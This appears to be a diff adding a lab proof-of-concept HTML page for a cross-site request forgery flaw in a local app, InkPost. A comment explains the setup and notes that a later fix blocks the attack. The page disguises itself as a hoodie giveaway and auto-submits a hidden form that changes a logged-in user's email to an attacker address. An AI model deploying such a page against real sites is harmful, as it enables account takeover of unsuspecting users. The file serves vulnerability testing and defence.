@@ -1,0 +1,39 @@
+<!doctype html>
+<!--
+  VULN-4 PoC — Cross-Site Request Forgery. LAB USE ONLY.
+
+  1. Log in to InkPost at http://localhost:5000 as alice.
+  2. In another terminal:  cd poc && python -m http.server 8000
+  3. Open http://localhost:8000/evil_csrf.html in the SAME browser.
+
+  The hidden form silently changes alice's email to attacker@evil.test
+  (the first step of an account takeover via password reset).
+  After FIX-4 the request is rejected with 400 Bad Request (missing CSRF token).
+
+  Note: this page is served from a different ORIGIN (port 8000) but the same
+  SITE (localhost), so SameSite=Lax alone would not stop it. The synchronizer
+  token is what blocks it.
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>You won a free society hoodie!</title>
+  <style>
+    body { font-family: system-ui, sans-serif; display: grid; place-items: center; min-height: 100vh; margin: 0; background: #fff7ed; }
+    .card { text-align: center; padding: 40px; border-radius: 20px; background: white; box-shadow: 0 10px 40px rgba(0,0,0,.1); }
+    h1 { color: #c2410c; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🎉 Congratulations!</h1>
+    <p>Claiming your free hoodie…</p>
+  </div>
+
+  <iframe name="sink" style="display:none"></iframe>
+  <form id="f" action="http://localhost:5000/settings/email" method="POST" target="sink">
+    <input type="hidden" name="email" value="attacker@evil.test">
+  </form>
+  <script>document.getElementById("f").submit();</script>
+</body>
+</html>
